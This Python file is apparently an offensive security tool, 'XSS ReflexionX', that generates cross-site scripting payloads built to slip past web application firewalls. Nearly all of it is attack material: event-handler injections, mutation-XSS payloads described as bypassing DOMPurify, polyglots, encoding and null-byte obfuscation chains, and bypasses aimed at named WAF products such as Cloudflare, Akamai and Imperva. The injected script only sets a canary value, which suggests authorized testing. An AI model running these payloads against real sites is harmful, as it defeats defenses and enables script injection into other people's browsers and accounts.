#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — Advanced WAF Evasion Engine
Goes beyond static payload lists with adaptive mutation chains,
mXSS exploitation, polyglot payloads, and encoding chains.

Techniques:
  - Multi-layer encoding chains (URL → double → unicode → hex entity)
  - mXSS payloads exploiting DOMPurify/browser parsing differentials
  - Polyglot payloads spanning HTML/JS/attr contexts
  - Rare event handlers not in typical WAF blocklists
  - Null byte / comment injection to break WAF pattern matching
  - Chunked parameter splitting
  - Case randomization and whitespace obfuscation

Usage:
    from waf_evasion_engine import WAFEvasionEngine
    engine = WAFEvasionEngine(canary="HF5XSSCONFIRMED")
    payloads = engine.generate_bypass(waf_id="cloudflare", context="html_body")
"""

import argparse, hashlib, random, re, string, sys
from urllib.parse import quote as url_quote, unquote

CANARY = "HF5XSSCONFIRMED"

# ── Rare Event Handlers (not in typical WAF blocklists) ──────
RARE_HANDLERS = [
    "onauxclick", "onbeforetoggle", "onscrollend",
    "onpointerrawupdate", "onbeforeinput", "onformdata",
    "onsecuritypolicyviolation", "onslotchange", "ontransitionrun",
    "ontransitionstart", "ontransitionend", "ontransitioncancel",
    "onanimationiteration", "oncontextlost", "oncontextrestored",
    "onpagereveal", "onpageswap", "onscrollsnapchanging",
    "onscrollsnapchange", "oncontentvisibilityautostatechange",
    "onbeforematch", "onpointerleave", "onpointerover",
    "onlostpointercapture", "ongotpointercapture", "onwheel",
    "ondragstart", "ondragend", "ondragover", "ondrop",
]

# ── Common Event Handlers (for mutation baseline) ────────────
COMMON_HANDLERS = [
    "onerror", "onload", "onfocus", "onmouseover", "onclick",
    "ontoggle", "onmouseenter", "onchange", "onkeydown",
    "onkeyup", "onsubmit", "oninput", "onblur", "ondblclick",
    "onresize", "onscroll", "onhashchange", "onpopstate",
]

# ── Tags that bypass common WAF rules ────────────────────────
BYPASS_TAGS = [
    "svg", "math", "details", "marquee", "video", "audio",
    "body", "iframe", "object", "embed", "form", "input",
    "select", "textarea", "meter", "progress", "dialog",
    "template", "slot", "xmp", "listing", "isindex",
    "image",  # browser auto-corrects to <img>
    "animate", "set", "use",  # SVG animation tags
]


class WAFEvasionEngine:
    """Adaptive WAF evasion with multi-technique payload generation."""

    def __init__(self, canary=None):
        self.canary = canary or CANARY
        self._js_exec = f"window._xss_confirmed='{self.canary}'"

    # ── Public API ───────────────────────────────────────────
    def generate_bypass(self, waf_id="unknown", context="html_body",
                        blocked_chars=None, max_payloads=50):
        """Generate WAF-specific bypass payloads.

        Parameters
        ----------
        waf_id : str
            WAF identifier (cloudflare, akamai, imperva, modsecurity, etc.)
        context : str
            Injection context (html_body, html_attribute, javascript, json)
        blocked_chars : set or None
            Characters known to be blocked by the WAF
        max_payloads : int
            Maximum number of payloads to return

        Returns
        -------
        list[dict]
            List of {payload, technique, priority} dicts
        """
        blocked = set(blocked_chars or [])
        payloads = []

        # Layer 1: Rare event handlers (highest priority — often not in WAF rules)
        payloads.extend(self._rare_handler_payloads(context, blocked))

        # Layer 2: Encoding chain mutations
        payloads.extend(self._encoding_chain_payloads(context, blocked))

        # Layer 3: mXSS payloads
        payloads.extend(self._mxss_payloads(blocked))

        # Layer 4: Polyglot payloads
        payloads.extend(self._polyglot_payloads(blocked))

        # Layer 5: WAF-specific bypasses
        payloads.extend(self._waf_specific_payloads(waf_id, context, blocked))

        # Layer 6: Whitespace/null byte obfuscation
        payloads.extend(self._obfuscation_payloads(context, blocked))

        # Layer 7: Comment injection
        payloads.extend(self._comment_injection_payloads(context, blocked))

        # Layer 8: Case randomization of existing payloads
        case_mutated = []
        for p in payloads[:20]:
            cm = self._randomize_case(p["payload"])
            if cm != p["payload"]:
                case_mutated.append({
                    "payload": cm,
                    "technique": p["technique"] + "+case_mutation",
                    "priority": p["priority"] - 1,
                })
        payloads.extend(case_mutated)

        # Deduplicate and sort by priority
        seen = set()
        unique = []
        for p in payloads:
            if p["payload"] not in seen:
                seen.add(p["payload"])
                unique.append(p)

        unique.sort(key=lambda x: x["priority"], reverse=True)
        return unique[:max_payloads]

    def mutate_payload(self, payload, techniques=None):
        """Apply multiple mutation techniques to a single payload."""
        techniques = techniques or ["url_encode", "double_encode",
                                     "unicode_escape", "hex_entity",
                                     "case_random", "null_byte",
                                     "tab_newline", "html_entity"]
        mutations = []
        for tech in techniques:
            m = self._apply_mutation(payload, tech)
            if m and m != payload:
                mutations.append({"payload": m, "technique": tech, "priority": 5})
        return mutations

    # ── Layer 1: Rare Event Handlers ─────────────────────────
    def _rare_handler_payloads(self, context, blocked):
        payloads = []
        js = self._js_exec

        tag_handler_combos = []
        for handler in RARE_HANDLERS:
            for tag in ["div", "span", "p", "a", "section", "article"]:
                tag_handler_combos.append((tag, handler))
            # SVG-specific rare handlers
            if handler.startswith("on"):
                tag_handler_combos.append(("svg", handler))

        for tag, handler in tag_handler_combos[:40]:
            attrs = ""
            if handler in ("onfocus", "onauxclick", "onbeforetoggle"):
                attrs = ' tabindex="1"'
            if handler == "onbeforetoggle":
                tag = "details"
                attrs = " open"

            p = f"<{tag}{attrs} {handler}={js}>"
            if context == "html_attribute":
                p = f'">{p}'

            if not self._has_blocked(p, blocked):
                payloads.append({
                    "payload": p,
                    "technique": f"rare_handler:{handler}",
                    "priority": 9,
                })

        return payloads[:25]

    # ── Layer 2: Encoding Chains ─────────────────────────────
    def _encoding_chain_payloads(self, context, blocked):
        payloads = []
        base_payloads = [
            f"<svg onload={self._js_exec}>",
            f"<img src=x onerror={self._js_exec}>",
            f"<details open ontoggle={self._js_exec}>",
        ]

        chains = [
            ("url_encode", lambda p: url_quote(p, safe="")),
            ("double_encode", lambda p: url_quote(url_quote(p, safe=""), safe="")),
            ("unicode_escape", self._unicode_encode),
            ("hex_entity", self._hex_entity_encode),
            ("html_entity_mix", self._html_entity_mixed),
            ("decimal_entity", self._decimal_entity_encode),
            ("js_unicode", self._js_unicode_encode),
        ]

        for base in base_payloads:
            for name, fn in chains:
                try:
                    encoded = fn(base)
                    if encoded and encoded != base:
                        payloads.append({
                            "payload": encoded,
                            "technique": f"encoding_chain:{name}",
                            "priority": 7,
                        })
                except Exception:
                    pass

        return payloads

    # ── Layer 3: mXSS Payloads ───────────────────────────────
    def _mxss_payloads(self, blocked):
        js = self._js_exec
        c = self.canary
        payloads = [
            # DOMPurify bypass via noscript re-contextualization
            {"payload": f'<noscript><p title="</noscript><img src=x onerror={js}>">',
             "technique": "mxss:noscript_recontextualize", "priority": 10},
            # Math+table parser differential
            {"payload": f"<math><mtext><table><mglyph><style><!--</style>"
                        f"<img src=x onerror={js}></table></mtext></math>",
             "technique": "mxss:math_table_differential", "priority": 10},
            # SVG foreignObject
            {"payload": f"<svg><foreignObject><body onload={js}></foreignObject></svg>",
             "technique": "mxss:svg_foreignobject", "priority": 9},
            # Template tag mutation
            {"payload": f"<template><img src=x onerror={js}></template>"
                        f"<script>document.querySelector('template').content</script>",
             "technique": "mxss:template_content", "priority": 8},
            # Style tag breakout
            {"payload": f"<style><img src=x onerror={js}//</style>",
             "technique": "mxss:style_breakout", "priority": 8},
            # Namespace confusion
            {"payload": f"<svg><desc><![CDATA[</desc>"
                        f"<img src=x onerror={js}>]]></svg>",
             "technique": "mxss:cdata_confusion", "priority": 8},
            # Title tag re-parse
            {"payload": f"<title><img src=x onerror={js}></title>",
             "technique": "mxss:title_reparse", "priority": 7},
            # XMP tag (raw text element)
            {"payload": f"<xmp><img src=x onerror={js}></xmp>",
             "technique": "mxss:xmp_rawtext", "priority": 7},
            # Iframe srcdoc mutation
            {"payload": f'<iframe srcdoc="<img src=x onerror={js}>"></iframe>',
             "technique": "mxss:iframe_srcdoc", "priority": 9},
        ]
        return [p for p in payloads if not self._has_blocked(p["payload"], blocked)]

    # ── Layer 4: Polyglot Payloads ───────────────────────────
    def _polyglot_payloads(self, blocked):
        js = self._js_exec
        c = self.canary
        payloads = [
            # Jaime Filson's classic polyglot (adapted)
            {"payload": f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={js} )//%0telerik",
             "technique": "polyglot:filson_classic", "priority": 10},
            # Multi-context breaker
            {"payload": f"'\"--></style></script><svg onload={js}//>",
             "technique": "polyglot:multi_context", "priority": 10},
            # Full spectrum polyglot
            {"payload": f"'\"><img src=x onerror={js}>//<svg/onload={js}//>",
             "technique": "polyglot:full_spectrum", "priority": 9},
            # Attribute + body + JS
            {"payload": f"\"'><details/open/ontoggle={js}//>",
             "technique": "polyglot:attr_body_js", "priority": 9},
            # JSON + HTML escape
            {"payload": f"}}}};{js}//\"'--><svg onload={js}>",
             "technique": "polyglot:json_html", "priority": 8},
            # URL + HTML
            {"payload": f"javascript:void({js})//&quot;><img src=x onerror={js}>",
             "technique": "polyglot:url_html", "priority": 8},
        ]
        return [p for p in payloads if not self._has_blocked(p["payload"], blocked)]

    # ── Layer 5: WAF-Specific Bypasses ───────────────────────
    def _waf_specific_payloads(self, waf_id, context, blocked):
        js = self._js_exec
        c = self.canary
        payloads = []

        if waf_id in ("cloudflare", "unknown"):
            payloads.extend([
                # Cloudflare: newline in tag breaks regex
                {"payload": f"<svg%0aonload={js}>",
                 "technique": "cloudflare:newline_tag", "priority": 9},
                # Cloudflare: slash instead of space
                {"payload": f"<svg/onload={js}>",
                 "technique": "cloudflare:slash_space", "priority": 9},
                # Cloudflare: tab separator
                {"payload": f"<svg\tonload={js}>",
                 "technique": "cloudflare:tab_separator", "priority": 8},
                # Cloudflare: form feed
                {"payload": f"<svg\x0conload={js}>",
                 "technique": "cloudflare:formfeed", "priority": 8},
            ])

        if waf_id in ("akamai", "unknown"):
            payloads.extend([
                # Akamai: double URL encode
                {"payload": url_quote(url_quote(f"<img src=x onerror={js}>", safe=""), safe=""),
                 "technique": "akamai:double_encode", "priority": 8},
                # Akamai: unicode normalization bypass
                {"payload": f"＜img src=x onerror={js}＞",
                 "technique": "akamai:fullwidth_tags", "priority": 7},
            ])

        if waf_id in ("imperva", "unknown"):
            payloads.extend([
                # Imperva: null byte before handler
                {"payload": f"<svg onload%00={js}>",
                 "technique": "imperva:null_before_handler", "priority": 8},
                # Imperva: unusual attribute ordering
                {"payload": f"<details open=open ontoggle={js} style=display:block>x",
                 "technique": "imperva:attr_ordering", "priority": 8},
            ])

        if waf_id in ("modsecurity", "unknown"):
            payloads.extend([
                # ModSecurity CRS: nested tags
                {"payload": f"<<svg onload={js}>>",
                 "technique": "modsecurity:nested_tags", "priority": 8},
                # ModSecurity: backtick instead of quotes
                {"payload": f"<img src=x onerror=`{js}`>",
                 "technique": "modsecurity:backtick_quotes", "priority": 7},
            ])

        if waf_id in ("f5_bigip", "unknown"):
            payloads.extend([
                # F5: marquee tag (often not blocked)
                {"payload": f"<marquee onstart={js}>",
                 "technique": "f5:marquee_tag", "priority": 8},
                # F5: audio tag
                {"payload": f"<audio src=x onerror={js}>",
                 "technique": "f5:audio_tag", "priority": 8},
            ])

        if waf_id in ("amazon_waf", "unknown"):
            payloads.extend([
                # AWS WAF: mixed case
                {"payload": f"<SvG oNlOaD={js}>",
                 "technique": "aws:mixed_case", "priority": 8},
                # AWS WAF: image tag (auto-corrects to img)
                {"payload": f"<image src=x onerror={js}>",
                 "technique": "aws:image_tag", "priority": 8},
            ])

        return [p for p in payloads if not self._has_blocked(p["payload"], blocked)]

    # ── Layer 6: Whitespace/Null Byte Obfuscation ────────────
    def _obfuscation_payloads(self, context, blocked):
        js = self._js_exec
        separators = [
            ("\t", "tab"), ("\n", "newline"), ("\r", "carriage_return"),
            ("\x0c", "form_feed"), ("\x00", "null_byte"),
            ("/", "slash"), ("\r\n", "crlf"),
        ]
        payloads = []
        for sep, name in separators:
            p = f"<svg{sep}onload={js}>"
            payloads.append({
                "payload": p,
                "technique": f"obfuscation:{name}_separator",
                "priority": 7,
            })

        # JavaScript obfuscation variants
        payloads.extend([
            {"payload": f"<svg onload=window['_xss_confirmed']='{self.canary}'>",
                "technique": "obfuscation:bracket_notation", "priority": 7},
            {"payload": f"<svg onload=window[`_xss_confirmed`]=`{self.canary}`>",
                "technique": "obfuscation:template_literal", "priority": 7},
            {"payload": f"<svg onload=eval(atob('{self._b64(js)}'))>",
                "technique": "obfuscation:base64_eval", "priority": 6},
            {"payload": f"<svg onload=setTimeout({js})>",
                "technique": "obfuscation:settimeout", "priority": 6},
        ])
        return [p for p in payloads if not self._has_blocked(p["payload"], blocked)]

    # ── Layer 7: Comment Injection ───────────────────────────
    def _comment_injection_payloads(self, context, blocked):
        js = self._js_exec
        payloads = [
            {"payload": f"<!--><img src=x onerror={js}>-->",
             "technique": "comment:html_comment_breakout", "priority": 7},
            {"payload": f"<svg><!--</svg><img src=x onerror={js}>-->",
             "technique": "comment:svg_comment_escape", "priority": 7},
            {"payload": f"<svg onload={js}><!--",
             "technique": "comment:trailing_comment", "priority": 6},
        ]
        return [p for p in payloads if not self._has_blocked(p["payload"], blocked)]

    # ── Encoding Helpers ─────────────────────────────────────
    def _unicode_encode(self, payload):
        return "".join(f"\\u{ord(c):04x}" if c in "<>\"'=" else c for c in payload)

    def _hex_entity_encode(self, payload):
        return "".join(f"&#x{ord(c):02x};" if c in "<>\"'=" else c for c in payload)

    def _decimal_entity_encode(self, payload):
        return "".join(f"&#{ord(c)};" if c in "<>\"'=" else c for c in payload)

    def _html_entity_mixed(self, payload):
        mapping = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"}
        return "".join(mapping.get(c, c) for c in payload)

    def _js_unicode_encode(self, payload):
        return payload.replace("alert", "\\u0061lert").replace("window", "\\u0077indow")

    def _b64(self, text):
        import base64
        return base64.b64encode(text.encode()).decode()

    def _randomize_case(self, payload):
        def _rc(m):
            tag = m.group(1)
            return "<" + "".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in tag
            )
        return re.sub(r"<(/?\w+)", _rc, payload)

    def _has_blocked(self, payload, blocked):
        return bool(blocked and any(c in payload for c in blocked))

    def _apply_mutation(self, payload, technique):
        if technique == "url_encode":
            return url_quote(payload, safe="")
        elif technique == "double_encode":
            return url_quote(url_quote(payload, safe=""), safe="")
        elif technique == "unicode_escape":
            return self._unicode_encode(payload)
        elif technique == "hex_entity":
            return self._hex_entity_encode(payload)
        elif technique == "case_random":
            return self._randomize_case(payload)
        elif technique == "null_byte":
            return payload.replace("<", "<\x00").replace(">", "\x00>")
        elif technique == "tab_newline":
            return payload.replace(" ", "\t").replace(">", ">\n")
        elif technique == "html_entity":
            return self._html_entity_mixed(payload)
        elif technique == "decimal_entity":
            return self._decimal_entity_encode(payload)
        return payload


# ── CLI ──────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ReflexionX v1.0.0 — WAF Evasion Engine")
    parser.add_argument("--test", action="store_true")
    parser.add_argument("--waf", default="unknown", help="WAF to bypass")
    parser.add_argument("--context", default="html_body")
    parser.add_argument("--max", type=int, default=30)
    args = parser.parse_args()

    engine = WAFEvasionEngine()

    if args.test:
        # Test each WAF
        for waf in ["cloudflare", "akamai", "imperva", "modsecurity",
                     "f5_bigip", "amazon_waf", "unknown"]:
            payloads = engine.generate_bypass(waf_id=waf, context="html_body")
            assert len(payloads) > 0, f"No payloads for WAF: {waf}"
            print(f"  [{waf}] -> {len(payloads)} bypass payloads")

        # Test mXSS
        payloads = engine.generate_bypass(waf_id="unknown", context="html_body")
        mxss = [p for p in payloads if "mxss" in p["technique"]]
        assert len(mxss) > 0, "No mXSS payloads generated"
        print(f"  [mXSS] -> {len(mxss)} mXSS payloads")

        # Test polyglots
        poly = [p for p in payloads if "polyglot" in p["technique"]]
        assert len(poly) > 0, "No polyglot payloads generated"
        print(f"  [Polyglots] -> {len(poly)} polyglot payloads")

        # Test mutations
        base = "<img src=x onerror=alert(1)>"
        mutations = engine.mutate_payload(base)
        assert len(mutations) > 0, "No mutations generated"
        print(f"  [Mutations] -> {len(mutations)} mutations of base payload")

        # Test canary in all payloads
        for p in payloads:
            assert CANARY in p["payload"] or "%" in p["payload"] or "\\" in p["payload"], \
                f"Canary missing from: {p['payload'][:60]}"

        print("\n[OK] WAF Evasion Engine self-test passed")
        sys.exit(0)

    payloads = engine.generate_bypass(waf_id=args.waf, context=args.context,
                                       max_payloads=args.max)
    print(f"[*] Generated {len(payloads)} bypass payloads for WAF={args.waf}")
    for i, p in enumerate(payloads, 1):
        print(f"  {i:3d}. [{p['technique']}] (pri={p['priority']}) {p['payload'][:100]}")
